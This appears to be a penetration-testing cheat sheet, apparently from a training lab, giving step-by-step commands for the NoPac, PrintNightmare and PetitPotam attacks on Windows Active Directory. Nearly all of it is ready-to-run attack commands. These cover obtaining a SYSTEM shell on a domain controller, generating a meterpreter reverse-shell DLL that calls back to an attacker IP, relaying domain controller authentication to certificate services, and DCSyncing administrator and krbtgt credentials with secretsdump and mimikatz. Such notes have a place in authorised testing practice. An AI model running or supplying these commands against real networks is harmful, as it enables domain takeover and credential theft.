# Bleeding Edge Vulnerabilities

## Bleeding Edge Vulnerabilities

### NoPac (SamAccountName Spoofing) - CVE-2021-42278 & CVE-2021-42287

```shellscript
git clone https://github.com/Ridter/noPac.git

# Scan the target to test if vulnerable => we need Current ms-DS-MachineAccountQuota > 0
sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap
 
# Get a SYSTEM shell => we will need to use exact paths instead of navigating the 
# directory because we have a semi interactive shell
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  -dc-host <DC_COMPUTER_NAME> -shell --impersonate administrator -use-ldap

# DCSync the Built-in Administrator account
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  -dc-host <DC_COMPUTER_NAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

### PrintNightmare - CVE-2021-34527 & CVE-2021-1675

```shellscript
# Install
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

# Test if exploit can work
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'

# Generate a dll payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f dll > backupscript.dll

# Host the payload on an smb share
sudo smbserver.py -smb2support <SHARE_NAME> <PATH_TO_PAYLOAD>

# Set up a metasploit handler
use multi/handler

# Exploit
sudo python3 CVE-2021-1675.py <DOMAIN>/<DOMAIN>:<PASS>@<DC_IP> '\\<ATTACKER_IP>\CompData\backupscript.dll'
```

#### PetitPotam (MS-EFSRPC) - CVE-2021-36942

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

```shellscript
# If we don't know the Web Enrollment URL for the CA host, use the following tool to attempt
# to locate it
https://github.com/zer1t0/certi
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Run the exploit
https://github.com/topotam/PetitPotam
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# In the relay window, we should get the base64 certificate for the Domain Controller
# Use the following to request a TGT for the DC
python3 gettgtpkinit.py <DOMAIN>/<DC_COMPUTER_NAME>\$ -pfx-base64 <b64> dc01.ccache

# Setting up the correct environment variable
export KRB5CCNAME=dc01.ccache

# DCSync the DC for its admin account
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Confirming access to the DC
nxc smb <DC_IP> -u administrator -H <HASH>

# Other way on linux
python /opt/PKINITtools/getnthash.py -key <KEY_FROM_GETTGTPKINIT> <DOMAIN>/<DC_COMPUTER_NAME>
secretsdump.py -just-dc-user <DOMAIN>/administrator "<DC_COMPUTER_NAME>"@<IP> -hashes <HASHES

# On windows
.\Rubeus.exe asktgt /user:<DC_COMPUTER_NAME> /certificate:<b64> /ptt
klist    # Confirm the ticket is in memory
.\mimikatz.exe
lsadump::dcsync /user:<DOMAIN>\krbtgt    # Try without user parameter
```
